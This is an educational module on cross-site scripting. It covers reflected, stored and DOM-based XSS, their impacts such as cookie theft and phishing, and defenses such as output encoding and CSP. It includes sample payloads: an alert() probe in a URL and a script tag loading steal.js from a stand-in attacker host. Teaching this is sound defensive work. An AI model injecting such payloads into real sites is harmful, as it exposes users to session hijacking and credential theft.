# Module 09: Web Attacks II (Cross-Site Scripting - XSS)

## 1. What is XSS?
Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious client-side scripts (usually JavaScript) into a web page viewed by other users. 

**The Key Concept**: XSS is not an attack on the server; it is an attack on the **users** of the server. The server is simply the "delivery vehicle" for the malicious script.

## 2. Types of XSS

### A. Reflected XSS (Non-Persistent)
The malicious script is "reflected" off the web server to the victim. It is usually delivered via a link.
- **How it works**: The script is part of a URL parameter.
- **Example**: `http://example.com/search?q=<script>alert('XSS')</script>`
- **Requirement**: The victim must click the link.

### B. Stored XSS (Persistent)
The most dangerous type. The malicious script is permanently stored on the target server (e.g., in a database, a comment section, or a user profile).
- **How it works**: The attacker posts a comment containing a script. Every user who views that comment executes the script.
- **Example**: A forum post that contains `<script src="http://attacker.com/steal.js"></script>`.

### C. DOM-based XSS
The vulnerability exists in the client-side code rather than the server-side code. The script is executed by modifying the Document Object Model (DOM).
- **How it works**: The script is processed by the browser's JavaScript, never touching the server.

## 3. Impact of XSS
- **Session Hijacking**: Stealing the `document.cookie` (session ID) to log in as the victim.
- **Phishing**: Creating a fake login form on top of a real website to steal passwords.
- **Redirection**: Forcing the user to visit a malicious website.
- **Defacement**: Changing the appearance of the website for the victim.

## 4. Prevention
- **Input Sanitization**: Strip tags like `<script>` from user input.
- **Output Encoding**: Convert `<` to `&lt;` and `>` to `&gt;` so the browser treats them as text, not code.
- **Content Security Policy (CSP)**: A browser-level security layer that tells the browser which scripts are allowed to run.
